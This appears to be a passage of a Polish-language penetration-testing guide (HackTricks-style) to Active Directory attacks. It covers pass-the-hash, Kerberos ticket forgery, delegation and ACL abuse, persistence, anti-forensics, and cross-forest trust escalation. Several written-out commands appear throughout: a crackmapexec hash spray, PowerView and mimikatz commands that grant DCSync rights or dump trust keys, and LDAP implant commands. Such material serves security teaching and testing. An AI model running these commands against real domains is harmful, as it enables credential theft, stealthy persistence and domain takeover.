Następnie należy zrzucić wszystkie hashe znajdujące się w pamięci i lokalnie.\
[**Przeczytaj tę stronę o różnych sposobach uzyskiwania hashy.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Gdy masz hash użytkownika**, możesz użyć go do **podszycia się pod niego**.\
Musisz użyć **narzędzia**, które **wykona** **uwierzytelnianie NTLM przy użyciu** tego **hasha**, **albo** możesz utworzyć nową **sessionlogon** i **wstrzyknąć** ten **hash** do **LSASS**, aby podczas wykonywania dowolnego **uwierzytelniania NTLM** użyty został właśnie **ten hash**. Ostatnią opcję stosuje mimikatz.\
[**Przeczytaj tę stronę, aby uzyskać więcej informacji.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Ten atak ma na celu **użycie hasha NTLM użytkownika do żądania ticketów Kerberos** jako alternatywy dla standardowego Pass The Hash z użyciem protokołu NTLM. Może to być szczególnie **przydatne w sieciach, w których protokół NTLM jest wyłączony** i jako protokół uwierzytelniania dozwolony jest wyłącznie **Kerberos**.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

W metodzie ataku **Pass The Ticket (PTT)** atakujący **kradną ticket uwierzytelniający użytkownika** zamiast jego hasła lub wartości hash. Następnie skradziony ticket służy do **podszycia się pod użytkownika**, zapewniając nieautoryzowany dostęp do zasobów i usług w sieci.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Ponowne użycie poświadczeń

Jeśli masz **hash** lub **hasło** **lokalnego administrato**ra, spróbuj użyć go do **lokalnego logowania** na innych **komputerach**.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Należy pamiętać, że jest to dość **noisy**, a **LAPS** pozwoliłby temu **mitigate**.

### Nadużycie MSSQL i zaufanych linków

Jeśli użytkownik ma uprawnienia do **access MSSQL instances**, może być w stanie użyć ich do **execute commands** na hoście MSSQL (jeśli działa jako SA), **steal** NetNTLM **hash** lub nawet przeprowadzić **relay** **attack**.\
Jeśli instancja MSSQL jest zaufana za pośrednictwem linku bazodanowego przez inną instancję, użytkownik posiadający uprawnienia do połączonej bazy danych może być w stanie **use the trust relationship to execute queries on the other instance**. Te relacje zaufania można łączyć, co ostatecznie może doprowadzić do źle skonfigurowanej bazy danych, w której użytkownik może wykonywać polecenia.\
**Links między bazami danych działają nawet przez forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Nadużycie platform IT do zarządzania zasobami i wdrażania

Zewnętrzne pakiety do inwentaryzacji i wdrażania często udostępniają skuteczne ścieżki do credentials i code execution. Zobacz:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Jeśli znajdziesz dowolny obiekt Computer z atrybutem [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) i masz domain privileges na tym komputerze, będziesz w stanie zrzucić z pamięci TGT wszystkich użytkowników, którzy logują się na tym komputerze.\
Jeśli więc **Domain Admin zaloguje się na komputerze**, będziesz w stanie zrzucić jego TGT i podszyć się pod niego za pomocą [Pass the Ticket](pass-the-ticket.md).\
Dzięki constrained delegation można nawet **automatycznie przejąć Print Server** (miejmy nadzieję, że będzie to DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Jeśli użytkownik lub komputer ma zezwolenie na "Constrained Delegation", będzie mógł **podszyć się pod dowolnego użytkownika, aby uzyskać dostęp do niektórych usług na komputerze**.\
Następnie, jeśli **compromise the hash** tego użytkownika/komputera, będziesz w stanie **podszyć się pod dowolnego użytkownika** (nawet domain admins), aby uzyskać dostęp do niektórych usług.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Posiadanie uprawnienia **WRITE** do obiektu Active Directory zdalnego komputera umożliwia uzyskanie code execution z **podwyższonymi uprawnieniami**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Nadużycie uprawnień/ACL

Przejęty użytkownik może mieć **interesujące uprawnienia do niektórych obiektów domeny**, które mogą pozwolić na późniejsze **poruszanie się** lateralnie/**eskalowanie** uprawnień.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Nadużycie usługi Printer Spooler

Wykrycie **Spool service listening** w domenie może zostać **abused**, aby **pozyskać nowe credentials** i **eskalować uprawnienia**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Nadużycie sesji osób trzecich

Jeśli **inni użytkownicy** **uzyskują dostęp** do **przejętej** maszyny, możliwe jest **gather credentials from memory**, a nawet **inject beacons in their processes**, aby się pod nich podszyć.\
Zazwyczaj użytkownicy uzyskują dostęp do systemu przez RDP, więc tutaj znajdziesz informacje o tym, jak przeprowadzić kilka ataków na sesje RDP osób trzecich:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** zapewnia system zarządzania **lokalnym hasłem Administratora** na komputerach dołączonych do domeny, gwarantując, że jest ono **losowe**, unikatowe i często **zmieniane**. Hasła te są przechowywane w Active Directory, a dostęp do nich jest kontrolowany za pomocą ACL i ograniczony wyłącznie do autoryzowanych użytkowników. Wystarczające uprawnienia do uzyskania dostępu do tych haseł umożliwiają pivoting do innych komputerów.


{{#ref}}
laps.md
{{#endref}}

### Kradzież certyfikatów

**Gathering certificates** z przejętej maszyny może być sposobem na eskalację uprawnień w środowisku:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Nadużycie szablonów certyfikatów

Jeśli skonfigurowane są **podatne szablony**, można je wykorzystać do eskalacji uprawnień:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation z kontem o wysokich uprawnieniach

### Zrzucanie credentials domeny

Po uzyskaniu uprawnień **Domain Admin** lub, jeszcze lepiej, **Enterprise Admin**, możesz **dump** **bazę danych domeny**: _ntds.dit_.

[**Więcej informacji o DCSync attack znajdziesz tutaj**](dcsync.md).

[**Więcej informacji o tym, jak ukraść NTDS.dit, znajdziesz tutaj**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc jako Persistence

Niektóre z wcześniej omówionych technik mogą zostać wykorzystane do persistence.\
Na przykład możesz:

- Uczynić użytkowników podatnymi na [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Uczynić użytkowników podatnymi na [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Nadać użytkownikowi uprawnienia [**DCSync**](#dcsync)

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** tworzy **legitimate Ticket Granting Service (TGS) ticket** dla określonej usługi, wykorzystując **NTLM hash** (na przykład **hash konta komputera**). Metoda ta służy do **uzyskania dostępu do uprawnień usługi**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** polega na uzyskaniu przez atakującego dostępu do **NTLM hash konta krbtgt** w środowisku Active Directory (AD). Konto to jest wyjątkowe, ponieważ służy do podpisywania wszystkich **Ticket Granting Tickets (TGTs)**, które są niezbędne do uwierzytelniania w sieci AD.

Po uzyskaniu tego hasha atakujący może tworzyć **TGTs** dla dowolnie wybranego konta (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Są podobne do golden tickets, ale są fałszowane w sposób, który **bypasses common golden tickets detection mechanisms.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistence konta z użyciem certyfikatów**

**Posiadanie certyfikatów konta lub możliwość ich żądania** to bardzo dobry sposób na utrzymanie persistence na koncie użytkownika (nawet jeśli zmieni on hasło):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistence domeny z użyciem certyfikatów**

**Użycie certyfikatów umożliwia również utrzymanie persistence z wysokimi uprawnieniami w domenie:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### Grupa AdminSDHolder

Obiekt **AdminSDHolder** w Active Directory zapewnia bezpieczeństwo **uprzywilejowanych grup** (takich jak Domain Admins i Enterprise Admins), stosując standardową **Access Control List (ACL)** do tych grup, aby zapobiegać nieautoryzowanym zmianom. Funkcja ta może jednak zostać wykorzystana; jeśli atakujący zmodyfikuje ACL obiektu AdminSDHolder, nadając pełny dostęp zwykłemu użytkownikowi, użytkownik ten uzyska szeroką kontrolę nad wszystkimi uprzywilejowanymi grupami. Mechanizm bezpieczeństwa mający zapewniać ochronę może więc przynieść odwrotny skutek i umożliwić nieuprawniony dostęp, jeśli nie jest dokładnie monitorowany.

[**Więcej informacji o grupie AdminDSHolder znajdziesz tutaj.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### Credentials DSRM

Na każdym **Domain Controller (DC)** istnieje konto **lokalnego administratora**. Po uzyskaniu praw administratora na takim komputerze można wyodrębnić hash lokalnego Administratora za pomocą **mimikatz**. Następnie konieczna jest modyfikacja rejestru, aby **włączyć używanie tego hasła**, co pozwoli na zdalny dostęp do lokalnego konta Administratora.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### Persistence ACL

Możesz **nadać** użytkownikowi pewne **specjalne uprawnienia** do określonych obiektów domeny, co pozwoli mu **eskalować uprawnienia w przyszłości**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Deskryptory zabezpieczeń

**Deskryptory zabezpieczeń** służą do **przechowywania** **uprawnień**, które **obiekt posiada** **do** innego **obiektu**. Jeśli możesz dokonać choćby **niewielkiej zmiany** w **deskryptorze zabezpieczeń** obiektu, możesz uzyskać bardzo interesujące uprawnienia do tego obiektu bez konieczności przynależności do uprzywilejowanej grupy.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Wykorzystaj pomocniczą klasę `dynamicObject` do tworzenia krótkotrwałych principalów/GPO/rekordów DNS z `entryTTL`/`msDS-Entry-Time-To-Die`; usuwają się automatycznie bez tombstones, zacierając dowody LDAP i pozostawiając osierocone SID-y, uszkodzone referencje `gPLink` lub buforowane odpowiedzi DNS (np. zanieczyszczenie ACE obiektu AdminSDHolder albo złośliwe przekierowania `gPCFileSysPath`/zintegrowanego z AD DNS).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Zmodyfikuj **LSASS** w pamięci, aby ustanowić **uniwersalne hasło**, zapewniające dostęp do wszystkich kont domeny.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Dowiedz się tutaj, czym jest SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Możesz utworzyć **własny SSP**, aby **przechwytywać w postaci jawnego tekstu** **credentials** używane do uzyskania dostępu do komputera.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Rejestruje **nowy Domain Controller** w AD i używa go do **wypchnięcia atrybutów** (SIDHistory, SPNs...) do określonych obiektów, **nie pozostawiając żadnych logów** dotyczących **modyfikacji**. Potrzebujesz uprawnień **DA** i musisz znajdować się w **root domain**.\
Należy pamiętać, że użycie nieprawidłowych danych spowoduje pojawienie się bardzo nieprzyjemnych logów.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Wcześniej omawialiśmy, jak eskalować uprawnienia, jeśli masz **wystarczające uprawnienia do odczytu haseł LAPS**. Hasła te mogą jednak również służyć do **utrzymywania persistence**.\
Sprawdź:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft uznaje **Forest** za granicę bezpieczeństwa. Oznacza to, że **compromising pojedynczej domeny może potencjalnie prowadzić do przejęcia całego Forest**.<sup>[[1]](#references)</sup>

### Podstawowe informacje

[**Domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) to mechanizm bezpieczeństwa umożliwiający użytkownikowi z jednej **domeny** dostęp do zasobów w innej **domenie**. Zasadniczo tworzy on połączenie między systemami uwierzytelniania obu domen, umożliwiając płynny przepływ weryfikacji uwierzytelniania. Gdy domeny ustanawiają trust, wymieniają i przechowują określone **keys** w swoich **Domain Controllers (DCs)**, które mają kluczowe znaczenie dla integralności trust.

W typowym scenariuszu, jeśli użytkownik chce uzyskać dostęp do usługi w **trusted domain**, musi najpierw zażądać specjalnego ticketu, znanego jako **inter-realm TGT**, od kontrolera DC własnej domeny. TGT jest szyfrowany za pomocą współdzielonego **key**, uzgodnionego przez obie domeny. Następnie użytkownik przedstawia ten TGT kontrolerowi **DC trusted domain**, aby otrzymać service ticket (**TGS**). Po pomyślnej walidacji inter-realm TGT przez DC trusted domain wystawia on TGS, przyznając użytkownikowi dostęp do usługi.

**Kroki**:

1. **client computer** w **Domain 1** rozpoczyna proces, używając swojego **NTLM hash** do zażądania **Ticket Granting Ticket (TGT)** od swojego **Domain Controller (DC1)**.
2. DC1 wystawia nowy TGT, jeśli klient zostanie pomyślnie uwierzytelniony.
3. Następnie klient żąda **inter-realm TGT** od DC1, który jest potrzebny do uzyskania dostępu do zasobów w **Domain 2**.
4. Inter-realm TGT jest szyfrowany za pomocą **trust key**, współdzielonego między DC1 i DC2 w ramach dwukierunkowego domain trust.
5. Klient przekazuje inter-realm TGT do **Domain Controller (DC2) domeny Domain 2**.
6. DC2 weryfikuje inter-realm TGT za pomocą współdzielonego trust key i, jeśli jest prawidłowy, wystawia **Ticket Granting Service (TGS)** dla serwera w Domain 2, do którego klient chce uzyskać dostęp.
7. Na koniec klient przedstawia ten TGS serwerowi, który jest szyfrowany za pomocą hasha konta serwera, aby uzyskać dostęp do usługi w Domain 2.

### Różne trust

Należy pamiętać, że **trust może być jednokierunkowy lub dwukierunkowy**. W przypadku opcji dwukierunkowej obie domeny ufają sobie nawzajem, natomiast w relacji **jednokierunkowej** jedna z domen będzie **trusted**, a druga **trusting**. W tym drugim przypadku **będziesz mieć dostęp do zasobów w trusting domain wyłącznie z trusted domain**.

Jeśli Domain A ufa Domain B, A jest trusting domain, a B trusted domain. Ponadto w **Domain A** będzie to **Outbound trust**, a w **Domain B** będzie to **Inbound trust**.

**Różne relacje trust**

- **Parent-Child Trusts**: Jest to typowa konfiguracja w ramach tego samego forest, w której child domain automatycznie ma dwukierunkowy, przechodni trust z parent domain. Oznacza to, że żądania uwierzytelniania mogą płynnie przepływać między parent i child.
- **Cross-link Trusts**: Nazywane „shortcut trusts”, są ustanawiane między child domains w celu przyspieszenia procesów referral. W złożonych forestach referral uwierzytelniania zazwyczaj musi przejść do forest root, a następnie wrócić do docelowej domeny. Utworzenie cross-links skraca tę drogę, co jest szczególnie korzystne w środowiskach rozproszonych geograficznie.
- **External Trusts**: Są konfigurowane między różnymi, niepowiązanymi domenami i z natury są non-transitive. Zgodnie z [dokumentacją Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) external trusts są przydatne do uzyskiwania dostępu do zasobów w domenie poza bieżącym forest, która nie jest połączona przez forest trust. Bezpieczeństwo jest wzmacniane przez SID filtering w external trusts.
- **Tree-root Trusts**: Trusts te są automatycznie ustanawiane między forest root domain a nowo dodanym tree root. Choć nie są często spotykane, tree-root trusts są ważne przy dodawaniu nowych drzew domen do forest, ponieważ umożliwiają im zachowanie unikatowej nazwy domeny i zapewniają dwukierunkową transitivity. Więcej informacji można znaleźć w [przewodniku Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Ten typ trust to dwukierunkowy, przechodni trust między dwiema forest root domains, który również wymusza SID filtering w celu zwiększenia bezpieczeństwa.
- **MIT Trusts**: Trusts te są ustanawiane z nie-Windowsowymi domenami Kerberos zgodnymi z [RFC4120](https://tools.ietf.org/html/rfc4120). MIT trusts są bardziej wyspecjalizowane i przeznaczone dla środowisk wymagających integracji z systemami opartymi na Kerberos poza ekosystemem Windows.

#### Inne różnice w **relacjach trust**

- Relacja trust może być również **transitive** (A ufa B, B ufa C, więc A ufa C) lub **non-transitive**.
- Relację trust można skonfigurować jako **bidirectional trust** (obie strony ufają sobie nawzajem) lub **one-way trust** (tylko jedna strona ufa drugiej).

### Ścieżka ataku

1. **Enumerate** relacje trust
2. Sprawdź, czy którykolwiek **security principal** (user/group/computer) ma **access** do zasobów **innej domeny**, na przykład przez wpisy ACE lub przynależność do grup innej domeny. Poszukaj **relacji między domenami** (prawdopodobnie właśnie w tym celu utworzono trust).
1. Kerberoast w tym przypadku może być kolejną opcją.
3. **Compromise** kont, które mogą wykonywać **pivot** między domenami.

Atakujący z dostępem do zasobów w innej domenie mogą uzyskać ten dostęp za pomocą trzech podstawowych mechanizmów:

- **Local Group Membership**: Principals mogą zostać dodani do lokalnych grup na komputerach, takich jak grupa „Administrators” na serwerze, co zapewnia im znaczną kontrolę nad tym komputerem.
- **Foreign Domain Group Membership**: Principals mogą również należeć do grup w foreign domain. Skuteczność tej metody zależy jednak od charakteru trust i zakresu grupy.
- **Access Control Lists (ACLs)**: Principals mogą być określeni w **ACL**, w szczególności jako encje w **ACEs** w ramach **DACL**, zapewniając im dostęp do określonych zasobów. Osoby chcące lepiej poznać mechanizmy ACL, DACL i ACE znajdą w whitepaperze „[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” nieocenione źródło informacji.<sup>[[17]](#references)</sup>

### Znajdowanie zewnętrznych użytkowników/grup z uprawnieniami

Możesz sprawdzić **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`**, aby znaleźć foreign security principals w domenie. Będą to użytkownicy/grupy z **external domain/forest**.

Możesz sprawdzić to w **Bloodhound** lub za pomocą powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Eskalacja uprawnień w lesie z podrzędnego do nadrzędnego
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Inne sposoby enumerowania zaufania domen:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Istnieją **2 zaufane klucze**: jeden dla _Child --> Parent_, a drugi dla _Parent_ --> _Child_.\
> Możesz znaleźć ten używany przez bieżącą domenę za pomocą:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Eskaluj do poziomu Enterprise admin w domenie child/parent, wykorzystując trust za pomocą SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit zapisywalnego Configuration NC

Zrozumienie sposobu wykorzystania Configuration Naming Context (NC) ma kluczowe znaczenie. Configuration NC służy jako centralne repozytorium danych konfiguracyjnych w całym lesie w środowiskach Active Directory (AD). Dane te są replikowane do każdego Domain Controller (DC) w lesie, przy czym zapisywalne DC utrzymują zapisywalną kopię Configuration NC. Aby to wykorzystać, należy posiadać **uprawnienia SYSTEM na DC**, najlepiej child DC.

**Połącz GPO z lokacją root DC**

Kontener Sites w Configuration NC zawiera informacje o lokacjach wszystkich komputerów dołączonych do domeny w lesie AD. Działając z uprawnieniami SYSTEM na dowolnym DC, atakujący mogą połączyć GPO z lokacjami root DC. Działanie to może doprowadzić do kompromitacji domeny root poprzez manipulowanie zasadami stosowanymi do tych lokacji.

Szczegółowe informacje można znaleźć w opracowaniu dotyczącym [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Compromise dowolnego gMSA w lesie**

Jeden z wektorów ataku polega na zaatakowaniu uprzywilejowanych gMSA w domenie. Klucz główny KDS, niezbędny do obliczania haseł gMSA, jest przechowywany w Configuration NC. Dzięki uprawnieniom SYSTEM na dowolnym DC można uzyskać dostęp do klucza głównego KDS i obliczyć hasła dowolnego gMSA w całym lesie.

Szczegółową analizę i instrukcje krok po kroku można znaleźć w:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Uzupełniający atak na delegowane MSA (BadSuccessor – wykorzystanie atrybutów migracji):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Dodatkowe zewnętrzne opracowanie: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Atak polegający na zmianie schematu**

Ta metoda wymaga cierpliwości i oczekiwania na utworzenie nowych uprzywilejowanych obiektów AD. Dzięki uprawnieniom SYSTEM atakujący może zmodyfikować AD Schema, aby przyznać dowolnemu użytkownikowi pełną kontrolę nad wszystkimi klasami. Może to prowadzić do nieautoryzowanego dostępu do nowo tworzonych obiektów AD i przejęcia nad nimi kontroli.

Dodatkowe informacje można znaleźć w opracowaniu [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**Od DA do EA za pomocą ADCS ESC5**

Luka ADCS ESC5 polega na przejęciu kontroli nad obiektami Public Key Infrastructure (PKI) w celu utworzenia szablonu certyfikatu umożliwiającego uwierzytelnianie jako dowolny użytkownik w lesie. Ponieważ obiekty PKI znajdują się w Configuration NC, kompromitacja zapisywalnego child DC umożliwia przeprowadzenie ataków ESC5.

Więcej szczegółów można znaleźć w [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> W scenariuszach, w których nie ma ADCS, atakujący może skonfigurować niezbędne komponenty, jak opisano w [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Zewnętrzna domena lasu - jednokierunkowa (Inbound) lub dwukierunkowa
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
W tym scenariuszu **Twoja domena jest zaufana** przez domenę zewnętrzną, co daje Ci **nieokreślone uprawnienia** w jej obrębie. Musisz znaleźć, **które podmioty zabezpieczeń z Twojej domeny mają jaki dostęp do domeny zewnętrznej**, a następnie spróbować go wykorzystać:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Zewnętrzna domena lasu - jednokierunkowa (wychodząca)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
W tym scenariuszu **twoja domena** **powierza** pewne **uprawnienia** principalowi z **innych domen**.

Jednak gdy **domena jest obdarzana zaufaniem** przez domenę ufającą, zaufana domena **tworzy użytkownika** o **przewidywalnej nazwie**, który jako **hasła używa hasła zaufania**. Oznacza to, że możliwe jest **uzyskanie dostępu do użytkownika z domeny ufającej, aby dostać się do zaufanej domeny**, przeprowadzić jej enumerację i spróbować uzyskać dalszą eskalację uprawnień:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Innym sposobem na skompromitowanie zaufanej domeny jest znalezienie [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) utworzonego w **przeciwnym kierunku** niż zaufanie domen (co nie zdarza się zbyt często).

Innym sposobem na skompromitowanie zaufanej domeny jest oczekiwanie na maszynie, do której **użytkownik z zaufanej domeny może uzyskać dostęp**, aby zalogował się przez **RDP**. Następnie atakujący może wstrzyknąć kod do procesu sesji RDP i stamtąd **uzyskać dostęp do domeny źródłowej ofiary**.\
Co więcej, jeśli **ofiara zamontowała swój dysk twardy**, atakujący może z poziomu procesu **sesji RDP** zapisać **backdoory** w **folderze autostartu dysku twardego**. Technika ta nosi nazwę **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Środki zaradcze przeciwko nadużywaniu zaufania domen

### **SID Filtering:**

- Ryzyko ataków wykorzystujących atrybut SID history w ramach zaufania między lasami jest ograniczane przez SID Filtering, który jest domyślnie aktywowany dla wszystkich zaufania między lasami. Opiera się to na założeniu, że zaufania wewnątrz lasu są bezpieczne, ponieważ zgodnie ze stanowiskiem Microsoftu granicą bezpieczeństwa jest las, a nie domena.
- Istnieje jednak pewien problem: SID filtering może zakłócać działanie aplikacji i dostęp użytkowników, co prowadzi do jego okazjonalnego wyłączania.

### **Selective Authentication:**

- W przypadku zaufania między lasami użycie Selective Authentication gwarantuje, że użytkownicy z obu lasów nie są automatycznie uwierzytelniani. Zamiast tego wymagane są jawne uprawnienia, aby użytkownicy mogli uzyskiwać dostęp do domen i serwerów w domenie lub lesie ufającym.
- Należy pamiętać, że środki te nie chronią przed wykorzystaniem zapisywalnego Configuration Naming Context (NC) ani przed atakami na konto zaufania.

[**Więcej informacji o zaufaniach domen w ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Nadużywanie AD oparte na LDAP z implantów działających na hoście

[LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) ponownie implementuje prymitywy LDAP w stylu bloodyAD jako x64 Beacon Object Files, które działają całkowicie wewnątrz implantu działającego na hoście (np. Adaptix C2). Operatorzy kompilują pakiet za pomocą `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, ładują `ldap.axs`, a następnie wywołują `ldap <subcommand>` z poziomu beacona. Cały ruch wykorzystuje bieżący kontekst bezpieczeństwa logowania przez LDAP (389) z podpisywaniem/szyfrowaniem lub LDAPS (636) z automatycznym zaufaniem certyfikatowi, dlatego nie są wymagane proxy socks ani artefakty na dysku.<sup>[[4]](#references)</sup>

### Enumeracja LDAP po stronie implantu

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` i `get-groupmembers` rozwiązują krótkie nazwy/ścieżki OU do pełnych DN i zrzucają odpowiadające im obiekty.
- `get-object`, `get-attribute` i `get-domaininfo` pobierają dowolne atrybuty (w tym deskryptory zabezpieczeń), a także metadane lasu/domeny z `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` i `get-rbcd` ujawniają bezpośrednio z LDAP kandydatów do roastingu, ustawienia delegowania oraz istniejące deskryptory [Resource-based Constrained Delegation](resource-based-constrained-delegation.md).
- `get-acl` i `get-writable --detailed` analizują DACL, aby wyświetlić trustee, uprawnienia (GenericAll/WriteDACL/WriteOwner/zapisy atrybutów) oraz dziedziczenie, zapewniając natychmiastowe cele do eskalacji uprawnień przez ACL.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives for escalation & persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) pozwalają operatorowi przygotować nowe principals lub konta komputerów wszędzie tam, gdzie istnieją uprawnienia OU. `add-groupmember`, `set-password`, `add-attribute` i `set-attribute` umożliwiają bezpośrednie przejęcie celów po znalezieniu uprawnień write-property.
- Polecenia skoncentrowane na ACL, takie jak `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` i `add-dcsync`, przekształcają WriteDACL/WriteOwner na dowolnym obiekcie AD w resetowanie haseł, kontrolę członkostwa w grupach lub uprawnienia replikacji DCSync bez pozostawiania artefaktów PowerShell/ADSI. Odpowiedniki `remove-*` usuwają wstrzyknięte ACE.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` natychmiast sprawiają, że przejęty użytkownik może być celem Kerberoasting; `add-asreproastable` (przełącznik UAC) oznacza go jako podatnego na AS-REP roasting bez modyfikowania hasła.
- Makra delegacji (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) modyfikują `msDS-AllowedToDelegateTo`, flagi UAC lub `msDS-AllowedToActOnBehalfOfOtherIdentity` z poziomu beaconu, umożliwiając ścieżki ataku constrained/unconstrained/RBCD i eliminując potrzebę użycia zdalnego PowerShell lub RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` wstrzykuje uprzywilejowane SID-y do historii SID kontrolowanego principal (zobacz [SID-History Injection](sid-history-injection.md)), zapewniając skryte dziedziczenie dostępu w całości przez LDAP/LDAPS.
- `move-object` zmienia DN/OU komputerów lub użytkowników, pozwalając atakującemu przenosić zasoby do OU, w których już istnieją delegowane uprawnienia, a następnie nadużywać `set-password`, `add-groupmember` lub `add-spn`.
